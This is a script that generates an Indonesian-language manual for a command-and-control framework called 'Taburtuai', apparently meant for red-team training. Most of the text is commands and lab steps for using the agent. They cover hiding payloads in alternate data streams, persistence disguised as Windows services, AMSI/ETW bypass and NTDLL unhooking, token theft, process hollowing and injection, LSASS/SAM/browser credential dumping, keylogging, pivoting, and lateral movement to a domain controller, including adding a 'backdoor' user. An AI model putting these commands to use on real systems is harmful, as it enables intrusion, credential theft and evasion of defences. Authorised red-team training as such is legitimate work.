code(doc, """# Identifikasi sistem
cmd <id> "systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'Domain'"

# Cek privileges
cmd <id> "whoami /priv"

# Cek user dan grup
cmd <id> "net user %USERNAME%"
cmd <id> "net localgroup administrators"

# Network info
cmd <id> "ipconfig /all"
cmd <id> "netstat -an | findstr LISTENING"
cmd <id> "arp -a"

# Proses berjalan
cmd <id> "tasklist /v"

# Antivirus / security tools
cmd <id> "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname"

# Environment variables
cmd <id> "set" --method powershell""")

lab_box(doc, "5.1", "Basic Situational Awareness")
step(doc, 1, "Eksekusi perintah whoami untuk verifikasi konteks eksekusi.")
code(doc, 'cmd <agent-id> "whoami /all" --wait')
step(doc, 2, "Kumpulkan informasi sistem dasar.")
code(doc, 'cmd <agent-id> "systeminfo" --wait')
step(doc, 3, "Periksa jaringan dari perspektif target.")
code(doc, 'cmd <agent-id> "ipconfig /all" --wait\ncmd <agent-id> "netstat -an" --wait')
step(doc, 4, "Cek proses yang sedang berjalan untuk mencari AV/EDR.")
code(doc, 'cmd <agent-id> "tasklist /v" --wait')

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 6 — FILE OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 6 — File Operations")

body(doc, "Taburtuai C2 mendukung transfer file bidireksional antara operator dan agent. File di-enkripsi sebelum transfer menggunakan kunci AES yang sama dengan payload C2.")

h2(doc, "Upload File (Operator → Target)")

body(doc, "Upload digunakan untuk mentransfer tools, payload, atau data ke mesin target.")

code(doc, """# Upload file ke path tertentu di target
files upload <agent-id> /local/path/tool.exe "C:\\Temp\\tool.exe"

# Upload dan tunggu konfirmasi
files upload <agent-id> ./mimikatz.exe "C:\\Windows\\Temp\\mim.exe" --wait

# Upload payload ke lokasi yang kurang mencurigakan
files upload <agent-id> ./payload.dll "C:\\Users\\Public\\Documents\\update.dll" """)

h2(doc, "Download File (Target → Operator)")

body(doc, "Download digunakan untuk mengambil data loot (credentials, dokumen, config) dari target.")

code(doc, """# Download file dari target
files download <agent-id> "C:\\Users\\john.doe\\Desktop\\sensitive.xlsx" ./loot/sensitive.xlsx

# Download NTDS.dit (setelah VSS shadow copy)
files download <agent-id> "C:\\Temp\\ntds.dit" ./loot/ntds.dit

# Download registry hive
files download <agent-id> "C:\\Temp\\SYSTEM" ./loot/SYSTEM.hiv""")

h2(doc, "ADS (Alternate Data Streams)")

body(doc, "NTFS ADS memungkinkan menyembunyikan data di dalam file yang terlihat normal. Teknik ini digunakan untuk menyembunyikan payload atau tools dari pemeriksaan sederhana.")

code(doc, """# Tulis payload ke ADS
ads write <agent-id> \\
  --source ./payload.exe \\
  --target "C:\\Windows\\System32\\calc.exe" \\
  --stream hidden

# Baca ADS
ads read <agent-id> \\
  --target "C:\\Windows\\System32\\calc.exe:hidden"

# Eksekusi dari ADS (via wscript/mshta)
ads exec <agent-id> "C:\\legit.txt:payload.js" --wait""")

lab_box(doc, "6.1", "File Transfer & ADS")
step(doc, 1, "Upload tools ke target.")
code(doc, 'files upload <agent-id> ./tools/nc.exe "C:\\Temp\\nc.exe" --wait')
step(doc, 2, "Verifikasi upload berhasil.")
code(doc, 'cmd <agent-id> "dir C:\\Temp" --wait')
step(doc, 3, "Buat file dummy dan sembunyikan data di ADS-nya.")
code(doc, 'cmd <agent-id> "echo legitimate content > C:\\Temp\\report.txt" --wait')
code(doc, 'ads write <agent-id> --source ./payload.exe --target "C:\\Temp\\report.txt" --stream data --wait')
step(doc, 4, "Download file hasil (simulasi exfiltration).")
code(doc, 'files download <agent-id> "C:\\Temp\\report.txt" ./exfil/report.txt --wait')

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 7 — PERSISTENCE
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 7 — Persistence")

body(doc, "Persistence memastikan agent tetap berjalan setelah reboot atau logout pengguna. Setiap metode memiliki trade-off antara stealth, persistence level, dan kemudahan deteksi.")

h2(doc, "Metode Persistence")

table(doc,
    ["Metode", "Level", "Trigger", "Deteksi", "Catatan"],
    [
        ("registry_run",   "User",   "User logon",    "Sedang", "HKCU atau HKLM Run key"),
        ("schtask",        "User/System", "Logon/Boot", "Sedang", "Task Scheduler"),
        ("service",        "System", "Boot",          "Tinggi",  "Butuh admin; paling reliabel"),
        ("startup_folder", "User",   "User logon",    "Rendah",  "Simpel, mudah dideteksi"),
    ],
    col_widths=[3.0, 2.0, 2.5, 2.5, 5.0]
)

h2(doc, "Registry Run Key")

code(doc, """# Persist via HKCU Run (tidak butuh admin)
persistence setup <agent-id> \\
  --method registry_run \\
  --name "WindowsSecurityUpdate" \\
  --wait

# Persist via HKLM Run (butuh admin)
persistence setup <agent-id> \\
  --method registry_run \\
  --name "WindowsUpdate" \\
  --hive HKLM \\
  --wait

# Hapus persistence
persistence remove <agent-id> --method registry_run --name "WindowsSecurityUpdate" --wait""")

h2(doc, "Scheduled Task")

code(doc, """# Scheduled task yang berjalan saat logon
persistence setup <agent-id> \\
  --method schtask \\
  --name "MicrosoftEdgeUpdate" \\
  --trigger logon \\
  --wait

# Scheduled task periodik (setiap 30 menit)
persistence setup <agent-id> \\
  --method schtask \\
  --name "WindowsDefenderScan" \\
  --trigger interval \\
  --interval 30 \\
  --wait""")

h2(doc, "Windows Service")

code(doc, """# Persist sebagai service (butuh SYSTEM atau admin)
persistence setup <agent-id> \\
  --method service \\
  --name "WinDefAdvSvc" \\
  --display "Windows Defender Advanced Service" \\
  --wait

# List persistence aktif
persistence list <agent-id> --wait""")

note(doc, "Selalu catat semua persistence yang dibuat selama engagement untuk cleanup yang bersih di akhir. Persistence yang tertinggal dapat menjadi backdoor tidak sengaja.")

lab_box(doc, "7.1", "Registry Run Persistence")
step(doc, 1, "Pasang persistence via registry run key.")
code(doc, 'persistence setup <agent-id> --method registry_run --name "WindowsUpdate" --wait')
step(doc, 2, "Verifikasi entry registry terbuat.")
code(doc, 'registry read <agent-id> --hive HKCU --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run" --value "WindowsUpdate" --wait')
step(doc, 3, "Simulasikan reboot (matikan dan jalankan ulang agent binary).")
step(doc, 4, "Verifikasi agent check-in ulang setelah 'reboot'.")
code(doc, "agents list")
step(doc, 5, "Bersihkan persistence.")
code(doc, 'persistence remove <agent-id> --method registry_run --name "WindowsUpdate" --wait')

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 8 — PROCESS MANAGEMENT & PPID SPOOFING
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 8 — Process Management & PPID Spoofing")

h2(doc, "Process Listing & Kill")

code(doc, """# List semua proses
process list <agent-id> --wait

# Kill proses berdasarkan PID
process kill <agent-id> --pid 4512 --wait

# Start proses baru (hidden)
process start <agent-id> \\
  --path "C:\\Windows\\System32\\cmd.exe" \\
  --args "/c whoami > C:\\Temp\\out.txt" \\
  --hidden \\
  --wait""")

h2(doc, "PPID Spoofing")

body(doc, "PPID (Parent Process ID) Spoofing membuat proses yang kita spawn terlihat seolah-olah di-launch oleh proses legitimate lain (misalnya explorer.exe atau svchost.exe). Ini mengacaukan process tree analysis oleh EDR.")

code(doc, """# Spawn cmd.exe dengan parent explorer.exe
inject ppid <agent-id> \\
  --exe "C:\\Windows\\System32\\cmd.exe" \\
  --args "/c calc.exe" \\
  --ppid-name explorer.exe \\
  --wait

# Spawn dengan parent PID spesifik
inject ppid <agent-id> \\
  --exe "C:\\Windows\\System32\\powershell.exe" \\
  --args "-enc <B64>" \\
  --ppid 1234 \\
  --wait""")

note(doc, "Tanpa PPID spoofing, proses yang di-spawn oleh agent akan terlihat sebagai child dari proses agent itu sendiri — pola yang mudah dideteksi EDR.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 9 — EVASION & BYPASS
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 9 — Evasion & Bypass")

body(doc, "Teknik evasion memungkinkan agent dan shellcode berjalan di lingkungan yang dilindungi AV/EDR. Taburtuai C2 mengimplementasikan berbagai bypass yang bekerja secara in-process (tidak butuh tool eksternal).")

h2(doc, "AMSI Bypass")

body(doc, "AMSI (Antimalware Scan Interface) adalah Microsoft API yang di-hook oleh AV/EDR untuk memeriksa script (PowerShell, VBScript, dll) sebelum dieksekusi. Bypass AMSI memungkinkan menjalankan script yang normalnya diblokir.")

code(doc, """# Bypass AMSI di proses agent (in-process)
bypass amsi <agent-id> --wait

# Bypass AMSI di proses lain (remote process via PID)
bypass amsi <agent-id> --pid 8844 --wait

# Output:
# [+] AMSI bypass applied successfully
# [i] AMSI scan interface patched in PID 8844""")

h2(doc, "ETW Bypass")

body(doc, "ETW (Event Tracing for Windows) digunakan oleh EDR untuk logging aktivitas process, network, dan file system. Bypass ETW mengurangi visibility EDR terhadap aktivitas agent.")

code(doc, """# Bypass ETW di proses agent
bypass etw <agent-id> --wait

# Bypass ETW di proses spesifik
bypass etw <agent-id> --pid 8844 --wait

# AMSI + ETW sekaligus (disarankan)
bypass amsi <agent-id> --wait
bypass etw  <agent-id> --wait""")

h2(doc, "NTDLL Unhooking")

body(doc, "EDR sering meng-hook fungsi NTDLL (syscall wrapper) untuk memantau API calls. Unhooking me-restore bytes original NTDLL dari disk atau KnownDLLs, menghapus hooks tersebut.")

code(doc, """# Unhook NTDLL (restore dari disk)
evasion unhook <agent-id> --wait

# Output:
# [+] NTDLL unhooked successfully
# [i] Restored 247 hooked functions from clean copy""")

h2(doc, "Sleep Obfuscation")

body(doc, "Saat agent sedang 'tidur' (menunggu beacon interval), memory agent bisa di-scan oleh AV. Sleep obfuscation meng-enkripsi memory agent selama sleep sehingga signature tidak terdeteksi.")

code(doc, """# Sleep obfuscation dengan durasi tertentu
evasion sleep <agent-id> --duration 30 --wait

# Aktifkan sleep masking permanen saat build
make agent-win-stealth \\
  C2_SERVER=http://IP:8080 \\
  ENC_KEY=Key \\
  SLEEP_MASKING=true""")

h2(doc, "Hardware Breakpoint (HWBP) — Patchless AMSI/ETW")

body(doc, "Teknik HWBP menggunakan debug register CPU (DR0-DR3) untuk intercept fungsi AMSI/ETW tanpa mengubah bytes memory — lebih stealth dari patch karena tidak meninggalkan IOC di memory.")

code(doc, """# AMSI bypass via hardware breakpoint (patchless)
evasion hwbp set <agent-id> \\
  --addr 0x7FFE0000 \\
  --register 0 \\
  --wait

# ETW bypass via HWBP
evasion hwbp set <agent-id> \\
  --addr 0x7FFE1000 \\
  --register 1 \\
  --wait

# Clear semua HWBP
evasion hwbp clear <agent-id> --wait""")

lab_box(doc, "9.1", "AMSI + ETW Bypass")
step(doc, 1, "Verifikasi bahwa PowerShell AMSI aktif (coba jalankan EICAR string).")
code(doc, 'cmd <agent-id> "powershell -c \'AMSI Test String\'" --method powershell --wait')
step(doc, 2, "Terapkan AMSI bypass di agent process.")
code(doc, "bypass amsi <agent-id> --wait")
step(doc, 3, "Terapkan ETW bypass.")
code(doc, "bypass etw <agent-id> --wait")
step(doc, 4, "Unhook NTDLL untuk menghapus EDR hooks.")
code(doc, "evasion unhook <agent-id> --wait")
step(doc, 5, "Coba jalankan PowerShell command yang sebelumnya diblokir.")
code(doc, 'cmd <agent-id> "powershell -c Get-Process" --method powershell --wait')

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 10 — TOKEN MANIPULATION
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 10 — Token Manipulation")

body(doc, "Windows access tokens menentukan security context sebuah proses. Dengan memanipulasi token, agent dapat mengimpersonasi pengguna lain (termasuk SYSTEM atau Domain Admin) tanpa mengetahui password mereka.")

h2(doc, "List Token")

code(doc, """# List semua token yang tersedia di sistem
token list <agent-id> --wait

# Output contoh:
# PID   PROCESS          USER              PRIVILEGES
# 624   lsass.exe        NT AUTHORITY\\SYSTEM  SeDebugPrivilege, SeTcbPrivilege...
# 1234  winlogon.exe     CORP\\john.doe     SeImpersonatePrivilege...
# 4512  explorer.exe     CORP\\administrator SeAssignPrimaryTokenPrivilege...""")

h2(doc, "Token Impersonation (Steal)")

body(doc, "Steal token dari proses yang berjalan sebagai pengguna target. Paling umum digunakan untuk mengambil token SYSTEM dari lsass atau winlogon.")

code(doc, """# Steal token dari proses SYSTEM (lsass PID)
token steal <agent-id> --pid 624 --wait

# Token domain admin dari sesi logon
token steal <agent-id> --pid 1234 --wait

# Verifikasi token berubah
cmd <agent-id> "whoami" --wait
# Output: NT AUTHORITY\\SYSTEM  (atau domain admin)""")

h2(doc, "Make Token (Pass-the-Password)")

body(doc, "Buat token baru menggunakan credential yang sudah diketahui. Berguna setelah mendapat plaintext password dari LSASS dump atau browser credentials.")

code(doc, """# Buat token dengan credential
token make <agent-id> \\
  --user john.doe \\
  --domain CORP \\
  --pass "CorpMail@2026!" \\
  --wait

# Jalankan perintah sebagai user tersebut
cmd <agent-id> "net use \\\\DC01\\IPC$ /user:CORP\\admin P@ssw0rd" --wait""")

h2(doc, "Revert Token")

code(doc, """# Kembali ke token original agent
token revert <agent-id> --wait""")

h2(doc, "Token RunAs (Spawn Process dengan Token)")

code(doc, """# Spawn process baru menggunakan token curian
token runas <agent-id> \\
  --pid 624 \\
  --exe "C:\\Windows\\System32\\cmd.exe" \\
  --args "/c whoami > C:\\Temp\\out.txt" \\
  --wait""")

note(doc, "Token manipulation membutuhkan SeImpersonatePrivilege atau SeAssignPrimaryTokenPrivilege. Jika agent berjalan sebagai service atau dengan token tertentu, privilege ini mungkin sudah tersedia.")

lab_box(doc, "10.1", "Privilege Escalation via Token Steal")
step(doc, 1, "List semua token yang tersedia.")
code(doc, "token list <agent-id> --wait")
step(doc, 2, "Identifikasi PID proses yang berjalan sebagai SYSTEM.")
step(doc, 3, "Steal token dari proses tersebut.")
code(doc, "token steal <agent-id> --pid <SYSTEM_PID> --wait")
step(doc, 4, "Verifikasi context sudah berubah.")
code(doc, 'cmd <agent-id> "whoami" --wait')
step(doc, 5, "Lakukan tindakan yang butuh SYSTEM (e.g., baca file SAM).")
code(doc, 'cmd <agent-id> "reg save HKLM\\SAM C:\\Temp\\SAM" --wait')
step(doc, 6, "Revert ke token semula.")
code(doc, "token revert <agent-id> --wait")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 11 — PROCESS INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 11 — Process Injection")

body(doc, "Process injection memungkinkan menjalankan shellcode atau DLL di dalam proses lain. Teknik ini digunakan untuk menghindari deteksi berbasis proses (shellcode jalan di proses legitimate) dan menaikkan privilege (inject ke proses yang lebih privileged).")

h2(doc, "Injection Methods")

table(doc,
    ["Teknik", "Deskripsi", "Stealth", "Catatan"],
    [
        ("CRT (inject remote)",    "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread",  "Rendah",   "Classic, banyak dideteksi EDR"),
        ("APC (inject remote)",    "QueueUserAPC ke suspended thread",                          "Sedang",   "Lebih stealth dari CRT"),
        ("inject self",            "Inject shellcode ke proses agent sendiri",                  "Sedang",   "Tidak butuh target PID"),
        ("hollow",                 "Process hollowing — shell code di proses PE baru",         "Tinggi",   "Auto-detect PE vs shellcode"),
        ("hijack",                 "Thread hijack di proses yang berjalan",                    "Tinggi",   "Tidak spawn thread baru"),
        ("stomp (DLL stomping)",   "Overwrite DLL legitimate di memory dengan shellcode",      "Sangat tinggi","Bypass memory scan"),
        ("mapinject",              "NtMapViewOfSection — shared memory ke proses target",      "Tinggi",   "Tidak ada RWX alloc"),
        ("threadless",             "Overwrite exception handler/callback, tidak spawn thread", "Sangat tinggi","Paling advanced"),
    ],
    col_widths=[3.5, 5.5, 2.5, 4.0]
)

h2(doc, "Classic Remote Injection")

code(doc, """# CRT injection ke proses target (PID)
inject remote <agent-id> --pid 3048 --file payload.bin --method crt --wait

# APC injection (lebih stealth)
inject remote <agent-id> --pid 3048 --file payload.bin --method apc --wait

# Inject ke proses dengan shellcode base64
inject remote <agent-id> --pid 3048 --shellcode-b64 <B64_SHELLCODE> --method crt --wait""")

h2(doc, "Self Injection")

code(doc, """# Inject shellcode ke proses agent sendiri
inject self <agent-id> --file payload.bin --wait

# Via base64 shellcode
inject self <agent-id> --shellcode-b64 <B64_SHELLCODE> --wait""")

h2(doc, "Process Hollowing")

body(doc, "Process hollowing men-spawn proses legitimate dalam state suspended, me-replace memory-nya dengan shellcode atau PE, lalu melanjutkan eksekusi. Proses yang terlihat di task manager adalah proses legitimate.")

code(doc, """# Hollow dengan shellcode (auto-detect)
hollow <agent-id> --file payload.bin --wait

# Hollow dengan PE binary
hollow <agent-id> --file payload.exe --wait

# Gunakan proses target tertentu sebagai host
hollow <agent-id> --file payload.bin --exe svchost.exe --wait""")

h2(doc, "DLL Stomping")

body(doc, "DLL stomping meng-overwrite bagian DLL legitimate yang sudah di-load di memory. Karena backed memory section berasal dari file DLL yang valid, memory scanner yang hanya memeriksa executable sections mungkin tidak mendeteksinya.")

code(doc, """# Stomp DLL legitimate dengan shellcode
stomp <agent-id> \\
  --file payload.bin \\
  --dll xpsservices.dll \\
  --wait

# DLL lain yang bisa dipakai
# xpsservices.dll, printui.dll, EhStorAuthn.dll, wer.dll""")

h2(doc, "Threadless Injection")

body(doc, "Mengoverwrite exception handler atau callback function di proses target. Tidak men-spawn thread baru — bypass EDR yang memonitor thread creation API calls.")

code(doc, """# Threadless injection ke PID
threadless_inject <agent-id> --pid 3048 --file payload.bin --wait""")

lab_box(doc, "11.1", "Process Hollowing")
step(doc, 1, "Generate shellcode Meterpreter atau Cobalt Strike untuk lab (atau gunakan calc.exe shellcode).")
step(doc, 2, "Upload shellcode ke target.")
code(doc, 'files upload <agent-id> ./shellcode.bin "C:\\Temp\\sc.bin" --wait')
step(doc, 3, "Eksekusi process hollowing.")
code(doc, 'hollow <agent-id> --file "C:\\Temp\\sc.bin" --exe svchost.exe --wait')
step(doc, 4, "Verifikasi proses svchost baru muncul di task manager.")
code(doc, 'process list <agent-id> --wait')
step(doc, 5, "Observasi apakah EDR memberikan alert.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 12 — CREDENTIAL ACCESS
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 12 — Credential Access")

body(doc, "Credential access adalah fase kritis dalam red team engagement. Credentials yang didapat membuka pintu untuk lateral movement, persistence, dan privilege escalation ke seluruh domain.")

h2(doc, "LSASS Dump")

body(doc, "LSASS (Local Security Authority Subsystem Service) menyimpan credential cache termasuk NTLM hashes, Kerberos tickets, dan plaintext password (jika WDigest aktif). Dump LSASS adalah teknik credential theft paling umum.")

code(doc, """# Dump LSASS ke file (method default: minidump)
creds lsass <agent-id> --output "C:\\Temp\\lsass.dmp" --wait

# Download hasil dump
files download <agent-id> "C:\\Temp\\lsass.dmp" ./loot/lsass.dmp

# Parse di mesin operator
# Dengan Mimikatz:
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Dengan pypykatz (Python):
pypykatz lsa minidump lsass.dmp""")

h2(doc, "Method Alternatif LSASS Dump")

body(doc, "AV/EDR sering memonitor akses langsung ke LSASS. Metode alternatif menggunakan teknik tidak langsung untuk menghindari deteksi.")

code(doc, """# Dump via handle duplication (bypass LSASS protection)
creds lsass-dup <agent-id> --output "C:\\Temp\\lsass_dup.dmp" --wait

# Dump via Windows Error Reporting (WER) — sangat stealth
creds lsass-wer <agent-id> --output "C:\\Temp\\" --wait
# Buat crash report LSASS, WER menyimpan dump otomatis""")

h2(doc, "SAM Database")

body(doc, "SAM (Security Account Manager) menyimpan local user account credentials. Untuk mendapatkannya, harus ada akses SYSTEM karena SAM di-lock oleh OS.")

code(doc, """# Dump SAM + SYSTEM hive (butuh SYSTEM token)
creds sam <agent-id> --output-dir "C:\\Temp" --wait

# Download hasilnya
files download <agent-id> "C:\\Temp\\SAM" ./loot/SAM
files download <agent-id> "C:\\Temp\\SYSTEM" ./loot/SYSTEM

# Parse di mesin operator
impacket-secretsdump -sam ./loot/SAM -system ./loot/SYSTEM LOCAL""")

h2(doc, "Browser Credentials")

body(doc, "Browser modern menyimpan password yang di-enkripsi dengan DPAPI menggunakan kunci yang terikat pada user account. Agent dapat mendekripsi credentials ini karena berjalan dalam context user yang sama.")

code(doc, """# Dump credentials dari semua browser yang terinstall
creds browser <agent-id> --wait

# Filter browser tertentu
creds browser <agent-id> --browser chrome --wait
creds browser <agent-id> --browser edge --wait
creds browser <agent-id> --browser firefox --wait

# Output contoh:
# [Chrome] https://mail.corp.com  john.doe@corp.com  CorpMail@2026!
# [Chrome] https://github.com    johndoe            gh_token_abc123...""")

h2(doc, "Clipboard")

code(doc, """# Ambil isi clipboard saat ini
creds clipboard <agent-id> --wait

# Berguna untuk menangkap password yang di-copy-paste oleh pengguna""")

lab_box(doc, "12.1", "LSASS Credential Extraction")
step(doc, 1, "Pastikan agent berjalan dengan privileges yang cukup (ideally SYSTEM via token steal).")
code(doc, "token steal <agent-id> --pid <SYSTEM_PID> --wait")
step(doc, 2, "Dump LSASS.")
code(doc, 'creds lsass <agent-id> --output "C:\\Temp\\lsass.dmp" --wait')
step(doc, 3, "Download dump ke mesin operator.")
code(doc, 'files download <agent-id> "C:\\Temp\\lsass.dmp" ./loot/lsass.dmp')
step(doc, 4, "Parse credentials (jalankan di luar C2 console).")
code(doc, "pypykatz lsa minidump ./loot/lsass.dmp")
step(doc, 5, "Catat semua credential yang didapat untuk digunakan di fase lateral movement.")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 13 — RECON
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 13 — Reconnaissance (Screenshot & Keylogger)")

h2(doc, "Screenshot")

body(doc, "Ambil screenshot layar target untuk mendapatkan konteks visual tentang apa yang sedang dilakukan pengguna dan aplikasi apa yang terbuka.")

code(doc, """# Ambil screenshot (disimpan sebagai PNG)
screenshot <agent-id> --wait

# Output: base64 PNG yang bisa di-decode
# Operator console otomatis menyimpan ke ./screenshots/""")

h2(doc, "Keylogger")

body(doc, "Keylogger mencatat semua keystroke pengguna untuk menangkap password, konten email, chat, dan informasi sensitif lainnya.")

code(doc, """# Mulai keylogger (background, tidak menghalangi command lain)
keylog start <agent-id> --wait

# Keylog dengan durasi terbatas (60 detik)
keylog start <agent-id> --duration 60 --wait

# Ambil hasil keylog
keylog dump <agent-id> --wait

# Output contoh:
# [10:23:41] [explorer.exe] user typed: "CorpMail@2026!"
# [10:23:55] [chrome.exe]   user typed: "john.doe@corp.com"

# Hentikan keylogger
keylog stop <agent-id> --wait

# Hapus log di memori agent
keylog clear <agent-id> --wait""")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 14 — NETWORK & PIVOTING
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 14 — Network & Pivoting")

body(doc, "Pivoting menggunakan agent yang sudah terkompromi sebagai jembatan untuk mengakses segmen jaringan internal yang tidak bisa diakses langsung dari internet. Taburtuai C2 mendukung beberapa mekanisme pivot.")

h2(doc, "Network Scanning (NetScan)")

body(doc, "Scan port TCP dari posisi agent untuk mendiscovery host dan service di jaringan internal.")

code(doc, """# Scan subnet standar
netscan <agent-id> \\
  --targets 192.168.1.0/24 \\
  --ports 22,80,443,445,3389,5985 \\
  --scan-timeout 2 \\
  --wait

# Scan host spesifik dengan port penuh
netscan <agent-id> \\
  --targets 192.168.1.100 \\
  --ports 1-65535 \\
  --workers 500 \\
  --wait

# Scan dengan banner grabbing
netscan <agent-id> \\
  --targets 192.168.1.0/24 \\
  --ports 22,80,21 \\
  --banners \\
  --wait""")

h2(doc, "ARP Scan")

code(doc, """# Dump ARP table (host aktif tanpa probe baru)
arpscan <agent-id> --wait

# Lebih stealth dari port scan — hanya baca tabel yang sudah ada""")

h2(doc, "SOCKS5 Proxy")

body(doc, "SOCKS5 proxy membuka listener di mesin agent sehingga operator bisa route semua tool (nmap, impacket, browser) melalui agent ke network internal.")

code(doc, """# Start SOCKS5 di agent (default 127.0.0.1:1080)
socks5 start <agent-id> --wait

# SOCKS5 dengan address custom
socks5 start <agent-id> --addr 0.0.0.0:9050 --wait

# Cek status
socks5 status <agent-id> --wait

# Konfigurasi proxychains (di mesin operator)
# echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Gunakan dengan tools
# proxychains nmap -sT -p 80,443 192.168.1.100
# proxychains python3 impacket/secretsdump.py CORP/admin@DC01

# Stop
socks5 stop <agent-id> --wait""")

h2(doc, "Port Forwarding (Reverse Tunnel)")

body(doc, "Port forwarding membuka TCP listener di server C2 dan me-relay koneksi ke target di network internal melalui agent. Cocok untuk mengakses satu service spesifik.")

code(doc, """# Buat tunnel RDP ke host internal
portfwd start <agent-id> 192.168.1.10:3389 --local-port 33899

# Lihat session aktif
portfwd list

# Setelah agent eksekusi (1 beacon interval):
# Konek RDP ke localhost:33899
xfreerdp /v:localhost:33899 /u:CORP\\john /p:'P@ss'
# Atau Windows:
# mstsc /v:localhost:33899

# Tunnel SSH
portfwd start <agent-id> 192.168.1.10:22 --local-port 2222
# ssh -p 2222 admin@localhost

# Tunnel HTTP internal
portfwd start <agent-id> 192.168.1.100:80 --local-port 8888
# curl http://localhost:8888/

# Stop session
portfwd stop fwd-1""")

lab_box(doc, "14.1", "Network Discovery & SOCKS5 Pivot")
step(doc, 1, "Scan jaringan internal dari posisi agent.")
code(doc, "netscan <agent-id> --targets 192.168.0.0/24 --ports 22,445,3389,5985 --wait")
step(doc, 2, "Dump ARP table untuk melihat host aktif.")
code(doc, "arpscan <agent-id> --wait")
step(doc, 3, "Start SOCKS5 proxy di agent.")
code(doc, "socks5 start <agent-id> --wait")
step(doc, 4, "Konfigurasi proxychains di mesin operator.")
code(doc, 'echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf')
step(doc, 5, "Akses host internal melalui proxy.")
code(doc, "proxychains curl http://192.168.0.100/")
step(doc, 6, "Stop SOCKS5 saat selesai.")
code(doc, "socks5 stop <agent-id> --wait")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 15 — LATERAL MOVEMENT
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 15 — Lateral Movement")

body(doc, "Lateral movement adalah proses berpindah dari satu host ke host lain di jaringan internal. Taburtuai C2 mendukung lima teknik lateral movement, semuanya menggunakan built-in Windows tools — tidak perlu binary tambahan.")

h2(doc, "Perbandingan Teknik")

table(doc,
    ["Teknik", "Tool", "Output", "Noise", "Prereq"],
    [
        ("DCOM (mmc20/shellwindows)", "powershell.exe", "Fire-and-forget", "⭐ Minimal", "Admin token"),
        ("WMI",                       "wmic.exe",       "Fire-and-forget", "Rendah",     "Admin + cred"),
        ("WinRM",                     "powershell.exe", "Output captured", "Rendah",     "Admin + WinRM on"),
        ("Schtask",                   "schtasks.exe",   "Fire-and-forget", "Sedang",     "Admin + cred"),
        ("Service",                   "sc.exe",         "Fire-and-forget", "Tinggi",     "Admin + cred"),
    ],
    col_widths=[4.5, 3.5, 3.5, 2.5, 4.0]
)

h2(doc, "DCOM — Paling Stealth")

body(doc, "DCOM (Distributed COM) mengaktifkan COM object di remote host dan memanggil method yang men-spawn process. Tidak ada service, scheduled task, atau named pipe — artefak paling minimal.")

code(doc, """# DCOM via MMC20.Application (default, paling kompatibel)
lateral dcom <agent-id> DC01 "powershell -enc <B64_STAGER>" --wait

# DCOM via ShellWindows (butuh desktop session aktif di target)
lateral dcom <agent-id> 192.168.1.100 \\
  "cmd /c net user backdoor P@ss /add" \\
  --method shellwindows --wait

# DCOM via ShellBrowserWindow (fallback)
lateral dcom <agent-id> FS01 \\
  "C:\\Windows\\Temp\\payload.exe" \\
  --method shellbrowser --wait

# Workflow: steal DA token dulu, lalu DCOM
token steal <agent-id> --pid <DA_SESSION_PID> --wait
lateral dcom <agent-id> DC01 "powershell -enc <B64>" --wait""")

h2(doc, "WMI Execution")

code(doc, """# WMI dengan credential eksplisit
lateral wmi <agent-id> 192.168.1.100 \\
  "cmd /c whoami > C:\\Temp\\out.txt" \\
  --user Administrator --domain CORP --pass 'Admin@2026' --wait

# WMI dengan current token (setelah token steal)
lateral wmi <agent-id> DC01 "powershell -enc <B64>" --wait""")

h2(doc, "WinRM (Output Captured)")

code(doc, """# WinRM — satu-satunya teknik yang capture output
lateral winrm <agent-id> DC01 \\
  "hostname; whoami; net user" \\
  --user john.doe --domain CORP --pass 'CorpMail@2026!' --wait

# Jalankan script PowerShell
lateral winrm <agent-id> FS01 \\
  "(Get-ChildItem C:\\Users -Recurse -Filter *.txt).FullName" \\
  --user admin --domain CORP --pass 'P@ss' --wait""")

h2(doc, "Scheduled Task Remote")

code(doc, """# Buat, jalankan, dan hapus schtask di remote host
lateral schtask <agent-id> 192.168.1.50 \\
  "powershell -w hidden -enc <B64>" \\
  --user Administrator --domain CORP --pass 'P@ss' --wait""")

lab_box(doc, "15.1", "Lateral Movement ke Domain Controller via DCOM")
step(doc, 1, "Kumpulkan credential dari LSASS dump (lihat Bagian 12).")
step(doc, 2, "Scan untuk menemukan DC di jaringan.")
code(doc, "netscan <agent-id> --targets 192.168.1.0/24 --ports 88,389,445 --wait")
step(doc, 3, "Steal token Domain Admin dari session yang ada.")
code(doc, "token list <agent-id> --wait\ntoken steal <agent-id> --pid <DA_PID> --wait")
step(doc, 4, "Eksekusi DCOM ke DC.")
code(doc, 'lateral dcom <agent-id> <DC_IP> "powershell -w hidden -enc <B64_STAGER>" --wait')
step(doc, 5, "Tunggu agent baru dari DC muncul di console.")
